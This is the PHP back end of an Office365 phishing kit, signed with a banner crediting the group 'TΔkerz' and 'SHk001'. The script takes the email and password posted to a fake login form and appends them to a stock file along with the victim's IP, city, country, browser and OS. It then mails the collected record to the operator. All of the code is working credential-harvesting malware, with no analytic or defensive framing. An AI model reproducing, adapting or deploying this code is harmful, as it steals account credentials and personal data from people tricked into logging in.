<?php if(isset($_POST['USR'])&&isset($_POST['PSS'])){
	session_start();
	include '../extra/mine.php';
$msg="//Office365 ¨ IK4 COPY ¨ SHk455\r\n";
$msg.="//----------------------------------------\r\n";
$msg.="[¤] E-mail	: {$_POST['USR']}\r\n";
$msg.="[¤] E-Code	: {$_POST['PSS']}\r\n";
$msg.="//----------------------------------------\r\n";
$msg.="[¤] E-Info	: {$_SESSION['ip']}/".now()." |{$_SESSION['browser']} on {$_SESSION['os']}\r\n";
$msg.="[¤] E-local	: {$_SESSION['ip_city']} , {$_SESSION['ip_countryName']} , {$_SESSION['currency']}\r\n";
$msg.="[¤] E-AGENT	: {$_SERVER['HTTP_USER_AGENT']}\r\n";
$msg.="//----------------------------------------\r\n\r\n\r\n";
$save=fopen("../0STOCk.txt","a+");fwrite($save,$msg);fclose($save);
$subject="ACCOUNT =?UTF-8?Q?=E2=9C=94_?= {$_SESSION['ip']} ¨¨ TΔkerz™";
$headers="From: lByedGang™ =?UTF-8?Q?=F0=9F=94=A5_?=<localhost@moneySquad.org>\r\n";
$headers.="MIME-Version: 1.0\r\n";
$headers.="Content-Type: text/plain; charset=UTF-8\r\n";
@mail($yours,$subject,$msg,$headers);exit('done');}
/*
████████████████████████████████████████████████████     `+hmMNh/`         
██ All RIGHTS ®RESERVED TO SHk001 AND ©TΔkerz ™ ! ██  `oNNMMMMMMNo`        
████████████████████████████████████████████████████  os/`-MMMMMMMd.       
                                                    -yNMMNhMMMMMMMMm`      
                                                   oNMMMMMMMMMMMMMMMo      
                                                 :dMMMMMMMMMMMMMMNMMm      
                                              `:hNMMMMMMMMMMMMMMMy:NM`     
                                           `:smMMMMMMMMMMMMMMMMMMN oM`     
                                     `.:/shmMMMMMMMMMMMMMMMMNsohNM``d  `   
                                 `-+ymNMMMMmMMMMMMMMMMMMMMMMh   -s  `  o+` 
                              `-odNMMMMMdo:dMMMMMMMMNNNMMMMMN`         yMh.
                            `+dNMMMMMMd/` +MMMMMMNy/-..-/smMMd.      -yMMMy
║║╔║║╔╗ ║                 .omMMMMMMMNo-:odNMMMMMm-`-+ssso:-:ohy.   -yNMMMMN
╠╣╠║║║║ ║               `+mMMMMMMMMMhhmMMMMMMMMN.:dNmNMMMMNdyo/:-:hNMMMMMMs
║║╚╚╚╚╝ O FR!END       :dMMMMMMMMMMMMMMMMMMMMMMy ms-`./yNMMMMMMMMMMMMMMMMh`
                     `sNMMMMMNNmmNMMMMMMMMMMMMMs o      .oNMMMMMMMMMMMMm+` 
                  ` `hMMNmho+:..-dMMMMMMMMMMMMMN.` `.--.  -dMMMMMMMMMMy.   
                .o- yNh+::oho` :mMMMNNMMMMMMMMMMmhhdd-     `hMMMMMMMN+     
              `+m+ ./.-sdMMh  :NMMm++NMMMMMMMMMMMMMMNy+//:` `mMMMMMm-      
       ``-/oshNMM: `/dMMMMM- .NMMh`-NNNmNNMMMMMMMMMMMMMMs`   +MMMMN-       
   `-oydNMMMMMMMMhodmmmNMMM  yMMN` //.  .sMMMMMMMMMMMMM+   ` `NMMM:        
 -smMy/::/odNMMMNy:`   ./mM` MMMy     .sNMMMMMMMMMMMMMN`   y  hMMs         
sMMM/       .+md.        `y-`MMMh    +NMMNsyMMMMMMMMMMMd: od  sMN`         
.dMM:         .:           . mMMM.  /MMMN- :mMMMMMhys+-  `Nd  oMs          
  :hNy/----/ohMM+         `  /MMMd` hMMM+ hMMMMMMMmo///` +MN  +M-          
    .+hMMMMMMMMMMNy+:/oss/`   yMMMN/oMMMo:MMMMMMMMMMMh-  yMM. +m           
       `:ohNMMMMMMMMMdo-  `+.  sMMMMdMMMNyMMMMMMMMh:`    yMM+ +s           
            `-:///:-`  .+hMMm.  :mMMMMMMMMMMMMMMMMMNo`   +MMd /:           
                 `.:+ymMMMMMMm:  `/hMMMMMMMMMMMMdo:--`   .MMM--`           
               .+shmmNNmdyhMMMMh-   .+ymNMMMMMMMMNy-:dh.  dMMh             
                  ```````oNMMMMMNd+.   ``.-:/oymMMMN+`dd  oMMM-            
                      .+mMMMMMMMMMMNds:`       `:hMMM:-M` :MMMo            
                    .omMMMNhNMMMMMMMMMMmo.       `sMMy m  `MMM/            
                     `.+mMMy.:sdNMMMMMMMMNs.       hMd +  `MMd`            
                        `sMMh. `.+hNMMMMMMMN+      :My `  /MN+o            
                       `` oMMm-   `-smMMMMMMMy`    `M/   `mMNN:            
                        :/`hMMm-./ .::yMMMdMMMy     m`   oMMMs             
                         :y+MMMNmy  /mhNMN`/NMM+    +   :NMMs`             
                          -mMMMMN-   yMMMN  :NMm       :NMd/               
                           sMMMM+    /MMMy   oMM-    `+dh/``               
                           yMMN+     +MMN.   .MM:   `//.`-oy               
                         `oMNh-     `dMN:     NM-   `-/ydMN:               
                        .yh+-       sMm:     .Md    hMMMMN+                
                        .`        `sNy.     `yN-   :MMMMN/                 
                                 -hh:      .yd-   `mMMMd-                  
                               `+o-      `+do`   .dMMNo`                   
                               `       `+y+`    :mMNs.                     
                                     .++-     -hMNs.                       
                                    ..      .yNd+`                         
                                          .ymo-                            
NAHA                                    `/+.                               
*/
?>